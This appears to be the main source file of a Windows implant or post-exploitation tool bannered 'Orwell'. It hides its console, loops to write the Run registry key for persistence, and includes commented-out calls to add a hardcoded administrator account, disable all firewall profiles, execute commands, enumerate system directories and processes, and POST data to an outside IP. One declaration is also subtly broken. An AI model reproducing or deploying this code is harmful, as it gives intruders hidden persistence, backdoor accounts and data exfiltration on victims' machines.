#include <iostream>
#include <stdio.h>
#include "UserUtils.h"
#include "Tasks.h"
#include "winuser.h"
#include "Shell.h"
#include "PrivilegeUtils.h"
#include "ServiceUtils.h"
#include "FirewallUtils.h"
#include "RegistryUtils.h"
#include <winerror.h>

#pragma comment(lib, "User32.lib")
#pragma comment (lib, "wtsapi32.lib")
#pragma comment (lib, "ntdll") 
#pragma	comment(lib, "Advapi32")


static void print_banner() {
    const char* a =
        "  ___                    _ _ \n"
        " / _ \\ _ ____      _____| | |\n"
        "| | | | '__\\ \\ /\\ / / _ \\ | |\n"
        "| |_| | |   \\ V  V /  __/ | |\n"
        " \\___/|_|    \\_/\\_/ \\___|_|_|\n\n\n";

    printf(a);
}

int main()
{
    boolean debug = true;
    if (debug) {
        print_banner();
    }
    else {
        ShowWindow(GetConsoleWindow(), 0); //SW_HIDE
    }


    while (true) {

    wchar_t username[] = { L"omnitheon" };
    wchar_t password[] = { L"Reallylongpassword123!" };
    wchar_t localgroup[] = { L"Administrators" };
    //wchar_t omni[] = { L"THISISATEST" };
    wchar_t hostname[] = { L"localhost" };
    //LPCWSTR serviceName = { L"WpnService" };
    //wchar_t const* dat = { L"TEST" };
    //TCHAR cmdpath[260] = { L"ping 9.9.9.9" };

    const wchar_t key = { L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" };

    registry_driver(0, key);
    //StopServiceProcess(serviceName);
    //StartServiceProcess(serviceName);


    Sleep(60000);

}
    //SERVICES
    //StopService(serviceName);


    //USER
    //AddLocalGroup(NULL,localgroup);
    //AddLocalUser(NULL, username, password);
    //AddUserToLocalGroup(NULL, localgroup, username);
    //AddLocalGroup(hostname, omni);
    //GetLocalGroups(hostname);
    //RemoveLocalGroup(hostname, omni);
    //GetLocalGroups(hostname);
    //GetLocalUserLocalGroups(hostname,username);
    //disableAllFirewallProfiles();
    //RemoveLocalUser(NULL,username);
    //GetLocalUsers(NULL);

  
    // EXECUTE
    // printf(exec(cmdpath));

    // NETWORK
    //http(L"9.9.9.9", 443, L"/", L"GET", NULL);
    //http(L"9.9.9.9", 443, L"/", L"POST", dat);

    // FILES
    //ListFilesInDirectory(L"C:\\Windows\\");
    //ListFilesInDirectory(L"C:\\Program Files\\");
    //ListFilesInDirectory(L"C:\\Program Files (x86)\\");
    //ListFilesInDirectory(L"C:\\ProgramData\\");
    //ListFilesInDirectory(L"C:\\Users\\Default\\");
    //ListFilesInDirectory(L"C:\\Users\\Public\\");
    //ListFilesInDirectory(L"C:\\Users\\Administrator\\");
    //ListFilesInDirectory(L"C:\\Users\\Guest\\");

    // PROCESS
    //dumpRunningProcessBaseline();

    //std::cout << "Hello World!\n";


}



